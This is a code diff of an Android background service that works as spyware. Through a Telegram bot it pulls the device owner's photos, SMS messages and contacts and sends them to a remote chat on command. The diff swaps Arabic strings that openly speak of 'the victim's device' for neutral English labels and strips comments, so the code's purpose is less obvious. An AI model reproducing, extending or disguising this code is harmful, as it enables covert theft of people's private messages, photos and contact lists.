@@ -59,7 +59,6 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // إرسال الإشعار للبوت بأقصى سرعة في Thread منفصل
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -67,7 +66,6 @@ public class BackgroundService extends Service {
             }
         }).start();
 
-        // الاستماع للأوامر في Thread آخر
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -103,27 +101,27 @@ public class BackgroundService extends Service {
 
             JSONObject json = new JSONObject();
             json.put("chat_id", CHAT_ID);
-            json.put("text", "✅ تم الاتصال بجهاز الضحية بنجاح!\n\nاختر العملية التي تريد سحبها:");
+            json.put("text", "✅ Connected successfully!\n\nChoose an action:");
 
             JSONArray keyboard = new JSONArray();
             
             JSONArray row1 = new JSONArray();
             JSONObject btnPhotos = new JSONObject();
-            btnPhotos.put("text", "📸 سحب الصور");
+            btnPhotos.put("text", "📸 Get Photos");
             btnPhotos.put("callback_data", "cmd_photos");
             row1.put(btnPhotos);
             keyboard.put(row1);
 
             JSONArray row2 = new JSONArray();
             JSONObject btnSms = new JSONObject();
-            btnSms.put("text", "💬 سحب الرسائل SMS");
+            btnSms.put("text", "💬 Get SMS");
             btnSms.put("callback_data", "cmd_sms");
             row2.put(btnSms);
             keyboard.put(row2);
 
             JSONArray row3 = new JSONArray();
             JSONObject btnContacts = new JSONObject();
-            btnContacts.put("text", "📞 سحب الأرقام");
+            btnContacts.put("text", "📞 Get Contacts");
             btnContacts.put("callback_data", "cmd_contacts");
             row3.put(btnContacts);
             keyboard.put(row3);
@@ -168,7 +166,7 @@ public class BackgroundService extends Service {
                     String data = callbackQuery.getString("data");
                     String callbackId = callbackQuery.getString("id");
 
-                    answerCallback(callbackId, "جاري التنفيذ...");
+                    answerCallback(callbackId, "Processing...");
 
                     if (data.equals("cmd_photos")) {
                         sendPhotos();
@@ -213,7 +211,7 @@ public class BackgroundService extends Service {
             }
             cursor.close();
             if (!batchUris.isEmpty()) sendMediaGroup(batchUris);
-            sendMsg("✅ تم الانتهاء من سحب الصور.");
+            sendMsg("✅ Photos completed.");
         } catch (Exception e) {}
     }
 
@@ -225,14 +223,14 @@ public class BackgroundService extends Service {
                 do {
                     String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                     String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    smsBuilder.append("من: ").append(address).append("\nالرسالة: ").append(body).append("\n-------------------\n");
+                    smsBuilder.append("From: ").append(address).append("\nMsg: ").append(body).append("\n-------------------\n");
                 } while (cursor.moveToNext());
                 cursor.close();
             }
             sendFile("messages_sms.txt", smsBuilder.toString());
-            sendMsg("✅ تم سحب الرسائل بنجاح.");
+            sendMsg("✅ SMS completed.");
         } catch (Exception e) {
-            sendMsg("❌ خطأ في سحب الرسائل: " + e.getMessage());
+            sendMsg("❌ SMS Error: " + e.getMessage());
         }
     }
 
@@ -244,14 +242,14 @@ public class BackgroundService extends Service {
                 do {
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                     String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    contactsBuilder.append("الاسم: ").append(name).append(" | الرقم: ").append(phone).append("\n");
+                    contactsBuilder.append("Name: ").append(name).append(" | Phone: ").append(phone).append("\n");
                 } while (cursor.moveToNext());
                 cursor.close();
             }
             sendFile("contacts.txt", contactsBuilder.toString());
-            sendMsg("✅ تم سحب الأرقام بنجاح.");
+            sendMsg("✅ Contacts completed.");
         } catch (Exception e) {
-            sendMsg("❌ خطأ في سحب الأرقام: " + e.getMessage());
+            sendMsg("❌ Contacts Error: " + e.getMessage());
         }
     }
 
